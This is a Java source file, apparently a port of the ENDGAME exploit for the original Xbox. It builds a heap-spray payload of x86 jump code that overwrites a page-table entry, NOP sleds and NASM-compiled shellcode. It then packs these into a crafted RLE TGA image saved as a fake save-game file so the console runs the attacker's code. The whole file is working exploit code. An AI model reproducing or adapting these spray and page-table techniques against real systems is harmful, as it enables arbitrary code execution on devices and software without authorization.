/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package jendgamexbox;

/**
 *
 * @author localadmin
 */
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;

public class Exploit {

    private boolean SIM_ENABLED;
    SwizzleUtils sutil = new SwizzleUtils();

    public Exploit() {
        boolean simEnabled;
        try {
            Class.forName("sim5960");
            simEnabled = true;
        } catch (ClassNotFoundException e) {
            simEnabled = false;
        }
        SIM_ENABLED = simEnabled;
    }

    //------------------------------------------------------------------------------
    // Util
    //------------------------------------------------------------------------------
    private final int PAGE_SIZE = 0x1000;
    private final int PTE_REGION = 0xc0000000;

    private int pteAddress(int address) {
        return PTE_REGION | (address >> 10);
    }

    private byte[] p32(int value) {
        return ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array();
    }

    private byte[] p16(int value) {
        return ByteBuffer.allocate(2).order(ByteOrder.LITTLE_ENDIAN).putShort((short) value).array();
    }

    //------------------------------------------------------------------------------
    // Exploit
    //------------------------------------------------------------------------------
    private final String BASE_PATH = new File(Exploit.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getParent();
    private final String ENDGAME_PATH = BASE_PATH + File.separator + "ENDGAME";

    private final int SPRAY_BASE = 0xF271B000;
    private final int SPRAY_JUMP_MID = SPRAY_BASE + 0x200000;
    private final int SPRAY_PAYLOAD_MID = SPRAY_BASE + 0x600000;

    private final int TARGET_KERN_PAGE = 0x80022000;
    private final int TARGET_XBEH_PAGE = 0x11000;

    private final int TARGET_KERN_PTE = pteAddress(TARGET_KERN_PAGE); // 0xc0200088
    private final int TARGET_XBEH_PTE = pteAddress(TARGET_XBEH_PAGE); // 0xc0000044

    private byte[] compileShellcode(String shellcodeFilepath, boolean debug) throws IOException, InterruptedException {
        if (!shellcodeFilepath.endsWith(".asm")) {
            throw new IllegalArgumentException("Shellcode filepath must end with .asm");
        }

        String nasmExecutable;
        if (System.getProperty("os.name").startsWith("Windows")) {
            nasmExecutable = BASE_PATH + File.separator + "nasm.exe";
        } else {
            nasmExecutable = "nasm";
            if (!Files.exists(Paths.get("/usr/bin/nasm"))) {
                throw new FileNotFoundException("NASM cannot be found in PATH");
            }
        }

        ProcessBuilder processBuilder = new ProcessBuilder(nasmExecutable, shellcodeFilepath);
        if (debug) {
            processBuilder.command().add(1, "-dDEBUG");
        }
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        int exitCode = process.waitFor();

        if (exitCode != 0) {
            throw new RuntimeException("Failed to compile shellcode: " + new String(process.getErrorStream().readAllBytes()));
        }

        String shellcodeBinFilepath = shellcodeFilepath.substring(0, shellcodeFilepath.lastIndexOf('.'));
        return Files.readAllBytes(Paths.get(shellcodeBinFilepath));
    }

    public void makeHelper(boolean compress, boolean debug) throws IOException, InterruptedException {
        int PTE_VALUE = SPRAY_PAYLOAD_MID & 0xFFFFF000;
        PTE_VALUE |= 0x63; // (Accessed | Dirty | Valid | Writable)

        // Jump payload
        byte[] jumpPayload = new byte[0];
        jumpPayload = concatenate(jumpPayload, new byte[]{(byte) 0xB8}, p32(TARGET_XBEH_PTE)); // mov eax, 0xc0000044
        jumpPayload = concatenate(jumpPayload, new byte[]{(byte) 0xC7, (byte) 0x00}, p32(PTE_VALUE)); // mov DWORD PTR [eax], 0xf2fb7063
        jumpPayload = concatenate(jumpPayload, new byte[]{(byte) 0x68}, p32(TARGET_XBEH_PAGE)); // push target
        jumpPayload = concatenate(jumpPayload, new byte[]{(byte) 0x0F, (byte) 0x01, (byte) 0x3C, (byte) 0x24}); // invlpg [esp]
        jumpPayload = concatenate(jumpPayload, new byte[]{(byte) 0xC3}); // ret

        // Jump page
        byte[] jumpPage = new byte[PAGE_SIZE];
        Arrays.fill(jumpPage, (byte) 0x90); // NOP
        System.arraycopy(jumpPayload, 0, jumpPage, jumpPage.length - jumpPayload.length, jumpPayload.length);

        // Align the jump payload to the end of the jump page
        jumpPage[jumpPage.length - jumpPayload.length + 0x64] = (byte) 0xB8;

        // Replicate the jump page across a 4MB block
        byte[] jumpBlock = new byte[0x400000];
        for (int i = 0; i < jumpBlock.length; i += jumpPage.length) {
            System.arraycopy(jumpPage, 0, jumpBlock, i, jumpPage.length);
        }

        // Shellcode page
        String shellcodeFilepath = BASE_PATH + File.separator + "shellcode.asm";
        byte[] shellcode = compileShellcode(shellcodeFilepath, debug);

        byte[] shellcodePage = new byte[PAGE_SIZE];
        Arrays.fill(shellcodePage, (byte) 0x90); // NOP
        System.arraycopy(shellcode, 0, shellcodePage, shellcodePage.length - shellcode.length, shellcode.length);

        // Replicate the shellcode page across a 4MB block
        byte[] shellcodeBlock = new byte[0x400000];
        for (int i = 0; i < shellcodeBlock.length; i += shellcodePage.length) {
            System.arraycopy(shellcodePage, 0, shellcodeBlock, i, shellcodePage.length);
        }

        // Construct the full helper blob
        byte[] full = new byte[0x800000];
        System.arraycopy(new byte[]{0x41, 0x51, 0x61, 0x71}, 0, full, 0, 4); // Marker DWORD for debug/mem searching
        System.arraycopy(jumpBlock, 4, full, 4, jumpBlock.length - 4); // 4MB of jump pages
        System.arraycopy(shellcodeBlock, 0, full, jumpBlock.length, shellcodeBlock.length); // 4MB of shellcode pages

        System.out.println("[*] Un-swizzling payload... ");
        byte[] unswizData = sutil.unswizzle32(full, 0x400, 0x800);
        System.out.println("done");

        byte[] finalData;
        if (compress) {
            System.out.println("[*] Compressing payload... ");
            finalData = rleCompress(unswizData, 0x400);
            System.out.println("done");
        } else {
            finalData = unswizData;
        }

        byte[] tgaData = makeTGA(400, 800, 4, finalData, 28, compress);

        if (SIM_ENABLED) {
            // Simulated load of TGA data
            System.out.println("[*] Simulated load of TGA data... ");
            // LoadTGA loadTGA = new LoadTGA();
            // boolean status = loadTGA.run(tgaData);
            // System.out.println("[*] Valid? " + status);
            // if (!status) {
            //     throw new RuntimeException("Simulated load of TGA data failed");
            // }
        }

        System.out.println("[*] Saving helper files... ");
        File sprayDir = new File(ENDGAME_PATH + File.separator + "helper" + File.separator + "0");
        sprayDir.mkdirs();

        Files.write(Paths.get(sprayDir.getParent() + File.separator + "TitleMeta.xbx"), ("\uFEFF" + "TitleName=HELPER\r\n").getBytes("UTF-16LE"));
        Files.write(Paths.get(sprayDir.getPath() + File.separator + "SaveImage.xbx"), tgaData);
        System.out.println("done");
    }

    private byte[] concatenate(byte[] a, byte[]... others) {
        int length = a.length;
        for (byte[] array : others) {
            length += array.length;
        }

        byte[] result = Arrays.copyOf(a, length);
        int offset = a.length;
        for (byte[] array : others) {
            System.arraycopy(array, 0, result, offset, array.length);
            offset += array.length;
        }

        return result;
    }

    public byte[] rleCompress(byte[] data, int width) {
        int depth = 4;
        ByteArrayOutputStream output = new ByteArrayOutputStream();

        for (int rowStart = 0; rowStart < data.length; rowStart += width) {
            int offset = rowStart;
            while (offset < rowStart + width) {
                byte[] pattern = new byte[depth];
                System.arraycopy(data, offset, pattern, 0, depth);
                offset += depth;
                int count = 0;

                while (offset < rowStart + width && count < 127) {
                    byte[] nextPattern = new byte[depth];
                    System.arraycopy(data, offset, nextPattern, 0, depth);
                    if (!Arrays.equals(nextPattern, pattern)) {
                        break;
                    }
                    count++;
                    offset += depth;
                }

                byte rleByte = (byte) (count > 0 ? 0x80 | count : 0);
                output.write(rleByte);
                output.write(pattern, 0, pattern.length);
            }
        }

        return output.toByteArray();
    }

    public byte[] makeTGA(int width, int height, int depth, byte[] data, int descriptor, boolean rle) {
        if (width <= 0 || width >= 0x10000) {
            throw new IllegalArgumentException("Invalid width");
        }
        if (height <= 0 || height >= 0x10000) {
            throw new IllegalArgumentException("Invalid height");
        }
        if (depth <= 0 || depth >= 5) {
            throw new IllegalArgumentException("Invalid depth");
        }

        TGAHeader tga = new TGAHeader();
        tga.setImgType((byte) 2);
        if (rle) {
            tga.setImgType((byte) (tga.getImgType() | 0x08));
        }
        tga.setWidth((short) width);
        tga.setHeight((short) height);
        tga.setImgDepth((byte) (depth * 8));
        tga.setImgDescriptor((byte) descriptor);

        byte[] headerBytes = tga.toBytes();
        byte[] result = new byte[headerBytes.length + data.length];

        System.arraycopy(headerBytes, 0, result, 0, headerBytes.length);
        System.arraycopy(data, 0, result, headerBytes.length, data.length);

        return result;
    }

}
